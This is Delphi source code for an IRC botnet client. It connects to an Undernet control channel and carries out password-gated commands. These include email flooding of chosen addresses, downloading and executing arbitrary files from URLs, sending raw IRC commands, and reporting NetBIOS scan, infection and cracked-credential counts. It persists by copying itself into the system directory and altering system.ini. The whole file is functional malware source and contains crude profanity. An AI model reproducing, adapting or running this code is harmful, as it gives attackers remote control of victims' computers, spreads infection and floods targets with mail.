   program Ircbot;
   uses
     windows,
     MXLookup,
     NetBios,
     winsock,ShellApi,
     Unit1 in 'Unit1.pas';

   CONST
     CRLF=#13#10;
     BUFLEN                   = 65536;

   VAR
    BUF              : ARRAY[0..36000]of char;
    SMTPServer       : STRING = '';
    SMTPAcc          : STRING = '';
    MASTER           : STRING = 'SIC';
    USERS            : STRING = 'SIC';
    PASS             : STRING = '0wn';
    buff:array[0..1024] of char;
    Send01,Answer:string;
    Stay_Alive:Boolean;
    channel2:string;

     function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   function AnsiUpperCase(const S: string): string;
   {$IFDEF MSWINDOWS}
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
    Result := WideUpperCase(S);
   end;
   {$ENDIF}

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   function extractfilename(s:String):string;
   begin
   while pos('\',s)>0 do begin
    s:=copy(s,pos('\',s)+1,length(s));
   end;
    result:=s;
   end;

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function sysdir:String;
   var
    ap:array[0..666]of char;
   begin
    getsystemdirectory(ap,255);
    result := ap;
    result := result+'\';
   end;

   PROCEDURE mailz(Recip:AnsiString);
   VAR
     ABC,ABC2,a,b,j: STRING;
     AttachmentPath,AttachmentName:string;
     MAIL,SUBJECT,FROM,BODY:string;
     i,h:integer;
     Sock             : TSocket;
     Wsadatas         : TWSADATA;
     SockAddrIn       : TSockAddrIn;

   FUNCTION Mys(STR:STRING) : BOOL;
   BEGIN
     IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
   END;

   BEGIN
     abc := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-|';
     abc2 := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-|                            ';
     randomize;
     h:=random(100);
     for i:=h downto 0 do Body := body + ABC2[random(length(abc2))];
     i:=random(12);
     for i:=h downto 0 do MAIL := MAIL + ABC[random(length(abc))];
     i:=random(20);
     for i:=h downto 0 do SUBJECT := SUBJECT + ABC2[random(length(abc2))];
     h:=random(8);
     for i:=h downto 0 do FROM := FROM + ABC[random(length(abc))];
     from := from + '@hotmail.com';

     AttachmentPath:=sysdir+AttachmentPath;
     copyfile(pchar(paramstr(0)),pchar(attachmentpath),false);
     AttachmentName:=ExtractFileName(AttachmentPath);

     SMTPServer:=GetSMTPAddress(Copy(recip,Pos('@',recip)+1,Length(recip)));

     IF SMTPServer<>'' THEN BEGIN
       WSAStartUp(257,wsadatas);
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
       SockAddrIn.sin_family:=AF_INET;
       SockAddrIn.sin_port:=htons(25);
       SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(getip(SMTPServer)));
       Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
       Mys('HELO '+copy(smtpserver,pos('.',smtpserver)+1,length(smtpserver))+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('MAIL FROM: '+from+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('RCPT TO: '+recip+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('DATA'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       randomize();
   a := '';
   b := '';
   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   j := 'Message-ID: '+a+'.'+b+'.qmail@'+copy(smtpserver,pos('.',smtpserver)+1,length(smtpserver));

       Mys(j+crlf);
       Mys('From: '+from+CRLF);
       Mys('Subject: '+Subject+CRLF);
       Mys('To: '+Recip+CRLF);
       Mys(Body+'you smell'+MAIL+CRLF+CRLF);
       Mys(CRLF+'.'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('QUIT'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Shutdown(Sock   ,2);
       CloseSocket(Sock);
     END;

   END;

   procedure Startup;
   var
    ab,nick:string;
    i,h:integer;
    begin    //Starts the socket and trys to connect.
     ab := 'abcdefghijklmnopqrstuvwxyz0123456789';
     WSAStartup(257,WSAData);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(6667);
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip('irc.undernet.org')));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));
     randomize;
     h:=random(8);
     for i:=h downto 0 do NICK:=NICK+copy(ab,random(length(ab)),1);
     RAW('USER '+NICK+' 0 '+NICK+' '+NICK+#13#10);
     nick := '';
     while length(nick) < 7 do
     nick := nick + inttostr(random(9));
     nick := 'fd0s'+nick;
     RAW('NICK '+nick+#13#10);
    end;

   Procedure Restart;
    begin     //Hence the name, restarts if it cant connect, or gets disconnected.
     Shutdown(Sock1,2);
     CloseSocket(Sock1);
     Sleep(5000);
     StartUp;
    end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure ReadSock;
   var
    M_Times:string;
    M_Mails:string;
    I      :integer;
    LAUNCH,h,e,j,o:string;
   FUNCTION NICK:String;
   begin
    result := ansiuppercase(copy(send01,2,pos('!',send01)-2));
   end;

   begin
    ZeroMemory(@send01,sizeof(send01));
    send01 := buff;
    ZeroMemory(@buff,sizeof(buff));
   if (pos('.IPR',uppercase(send01))>0) then begin

    answer := copy(send01,pos('IPR',ansiuppercase(send01))+4,length(send01));
    answer := copy(answer,1,length(answer)-2);

    H := (copy(answer,1,pos(';',answer)-1));
    answer := copy(answer,pos(';',answer)+1,length(answer));
    E := (copy(answer,1,pos(';',answer)-1));
    answer := copy(answer,pos(';',answer)+1,length(answer));
    J := (copy(answer,1,pos(';',answer)-1));
    answer := copy(answer,pos(';',answer)+1,length(answer));

    if (h = 'x') or (h = 'X') then IP1 := 'X' else IP1 := h;
    if (e = 'x') or (e = 'X') then IP2 := 'X' else IP2 := e;
    if (j = 'x') or (j = 'X') then IP3 := 'X' else IP3 := j;

    RAW('PRIVMSG '+channel+' :Scanning ('+ip1+'.'+ip2+'.'+ip3+'.X)'+#13#10);

   end else

   if (pos('.MAIL',uppercase(send01))>0) then begin
   If POS(NICK,USERS)=0 then begin
   RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
   end;
    answer := copy(send01,pos('MAIL',ansiuppercase(send01))+5,length(send01));

    // <SiC> MAIL tagge_70@hotmail.com;tagge_70@hotmail.com&1;

    // set times.
    M_Times := copy(answer,pos('&',answer)+1,length(answer));
    M_Times := copy(M_Times,1,pos(';',M_Times)-1);

    // set mails.
    M_Mails := copy(answer,1,pos('&',answer)-1);
    // mail them.
    ZeroMemory(@buff,sizeof(buff));
    ZeroMemory(@send01,sizeof(send01));
    while M_Mails <> '' do begin
     RAW('PRIVMSG '+CHANNEL+' :Starting to flood : '+copy(M_Mails,1,pos(';',M_Mails)-1)+' with ['+m_times+'] mails'+#13#10);
     for i:=0 to strtoint(M_Times)-1 do begin
      Mailz(copy(M_Mails,1,pos(';',M_Mails)-1));
      RAW('PRIVMSG '+channel+' :['+inttostr((i+1))+']Mail sent to :'+copy(M_Mails,1,pos(';',M_Mails)-1)+'.'+#13#10);
     end;
     RAW('PRIVMSG '+CHANNEL+' :Done flooding : '+copy(M_Mails,1,pos(';',M_Mails)-1)+' with ['+m_times+'] mails'+#13#10);
      m_mails := copy(m_mails, pos(';',m_mails)+1,length(m_mails));
    end;
   end else

   if pos('MOTD',uppercase(send01))>0 then begin
    RAW('Join '+Channel+#13#10);
   end else

   if pos('PING',uppercase(send01))>0 then begin
    Answer := copy(send01,pos('PING',uppercase(send01))+6,length(send01));
    Answer := copy(answer,1,pos(#13#10,answer)-1);
    RAW('PONG :'+answer+#13#10);
   end else

   if pos('.NBCRACK',uppercase(send01))>0 then begin
   If POS(NICK,USERS)=0 then begin
   RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
   end;
    h := NB_PASS;
    e := NB_USERNAME;
    while length(h) < 6 do h:=' '+h;
    while length(e) < 6 do e:=' '+e;
    RAW('PRIVMSG '+Channel+' :NB Username :['+H+'] '+
                             'NB Password :['+E+']'+#13#10);

   end else
   if pos('.NBINFO',uppercase(send01))>0 then begin
   If POS(NICK,USERS)=0 then begin
   RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
   end;
    h := NB_SCANNED;
    e := NB_OPEN;
    j := NB_CLOSED;
    o := NB_INFECT;
    while length(h) < 5 do h:=' '+h;
    while length(e) < 5 do e:=' '+e;
    while length(j) < 5 do j:=' '+j;
    while length(o) < 5 do o:=' '+o;
    RAW('PRIVMSG '+Channel+' :NB IP scanned :['+H+'] '+
                             'NB IP open :['+E+'] '+
                             'NB IP closed :['+J+'] '+
                             'NB infected :['+O+']'+#13#10);
   end else
   if pos('.QUIT',uppercase(send01))>0 then begin
    if pos(NICK,USERS) > 0 then begin
     RAW('QUIT :As my master wish.'+#13#10);
     sleep(250);
     exitprocess(0);
    end else begin
     RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
    end;
   end else
   if pos('.RESTART',uppercase(send01))>0 then begin
    if pos(NICK,USERS) > 0 then begin
     RAW('QUIT :As my master wish.'+#13#10);
     Winexec(pchar(sysdir+'Explorere.com'),0);
     sleep(500);
     exitprocess(0);
    end else begin
     RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
    end;
     ZeroMemory(@buff,sizeof(buff));
    ZeroMemory(@send01,sizeof(send01));
   end else
   if pos('.LOGIN',uppercase(send01))>0 then begin
    Answer := copy(send01,pos('.LOGIN',uppercase(send01))+7,length(send01));
    Answer := copy(answer,1,length(answer)-2);
    IF PASS = ANSWER then begin
     RAW('PRIVMSG '+CHANNEL+' :Password Accepted!'+#13#10);
     If POS(NICK,USERS)=0 then USERS := USERS+NICK;
    end else begin
     RAW('PRIVMSG '+CHANNEL+' :Password Failed!'+#13#10);
    end;
     ZeroMemory(@buff,sizeof(buff));
    ZeroMemory(@send01,sizeof(send01));
   end else

   if pos('.LOGOUT',uppercase(send01))>0 then begin
    if POS(NICK,USERS)>0 then begin
     RAW('PRIVMSG '+CHANNEL+' :User logged out.'+#13#10);
     i := pos(NICK,USERS);
     delete(USERS,i,LENGTH(NICK));
    end else begin
     RAW('PRIVMSG '+CHANNEL+' :User not logged in.'+#13#10);
    end;
     ZeroMemory(@buff,sizeof(buff));
    ZeroMemory(@send01,sizeof(send01));
   end else

   if pos('.DL',uppercase(send01))>0 then begin
   If POS(NICK,USERS)=0 then begin
   RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
   end;
    Answer := copy(send01,pos('.DL',uppercase(send01))+4,length(send01));
    M_Times := copy(answer,pos('&',answer)+1,length(answer));
    M_Times := copy(M_Times,1,pos(';',M_Times)-1);
    M_Mails := copy(answer,1,pos('&',answer)-1);
    LAUNCH := copy(answer,pos(';',answer)+1,length(answer));
    LAUNCH := COPY(LAUNCH,1,LENGTH(LAUNCH)-2);
    RAW('PRIVMSG '+channel+' :Downloading file '+M_MAILS+#13#10);
    Dfile(0,pchar(M_MAILS),pchar(sysdir+M_TIMES),0,0);
    if launch = '1' then begin
    RAW('PRIVMSG '+channel+' :Downloaded, executing.'+#13#10);
    ShellExecute(0, 'open', pChar(sysdir+m_times), 0,0,0);
    end else
    RAW('PRIVMSG '+channel+' :Downloaded.'+#13#10);
    ZeroMemory(@buff,sizeof(buff));
    ZeroMemory(@send01,sizeof(send01));
   end else

   if pos('.UD',uppercase(send01))>0 then begin
   If POS(NICK,USERS)=0 then begin
   RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
   end;
    Answer := copy(send01,pos('.UD',uppercase(send01))+4,length(send01));
    M_Times := copy(answer,pos('&',answer)+1,length(answer));
    M_Times := copy(M_Times,1,pos(';',M_Times)-1);
    M_Mails := copy(answer,1,pos('&',answer)-1);
    LAUNCH := copy(answer,pos(';',answer)+1,length(answer));
    LAUNCH := COPY(LAUNCH,1,LENGTH(LAUNCH)-2);
    RAW('PRIVMSG '+channel+' :Downloading file '+M_MAILS+#13#10);
    Dfile(0,PCHAR(M_MAILS),pchar(sysdir+M_TIMES),0,0);
    if launch = '1' then begin
    RAW('PRIVMSG '+channel+' :Downloaded, executing.'+#13#10);
    ShellExecute(0, 'open', pChar(sysdir+m_times), 0,0,0);
    end else
    RAW('PRIVMSG '+channel+' :Downloaded.'+#13#10);

    RAW('QUIT :Master told me to update ;)'+#13#10);
    sleep(250);
    exitprocess(0);

   end else

   if pos('.RAW',uppercase(send01))>0 then begin
   If POS(NICK,USERS)=0 then begin
   RAW('PRIVMSG '+channel+' :Your not logged in'+#13#10);exit;
   end;
    Answer := copy(send01,pos('.RAW',uppercase(send01))+5,length(send01));
    RAW(ANSWER);
    ZeroMemory(@buff,sizeof(buff));
    ZeroMemory(@send01,sizeof(send01));
   end;
   end;

   procedure netnet;
   begin
    StartNetBios(50);
   end;

   var AFG:LONGWORD;
   begin
    // make it run ircbot until we tells ircbot to die.
    NB_SCANNED:='0';
    NB_CLOSED :='0';
    NB_OPEN   :='0';
    NB_INFECT :='0';
    copyfile(pchar(paramstr(0)),pchar(sysdir+'Explore.com'),false);
    writeprivateprofilestring('boot','shell',pchar('Explorer.exe Explore.com'),'system.ini');
    Channel := '#fuckmeintheass cocksucker';
    Stay_Alive := true;
    CreateThread(nil, 0, @netnet, nil, 0, afg);
    StartUp;
    // while Stay_Alive check if connection is found, and if so, recive msg.
    While Stay_Alive do begin
     // if connection is done.. then
     if (recv(Sock1,buff,SizeOf(buff),0)) < 1 then
       Restart // no connection, lets restart.
      else
       ReadSock; // read my socks.
    end; // stay_alive

   end.
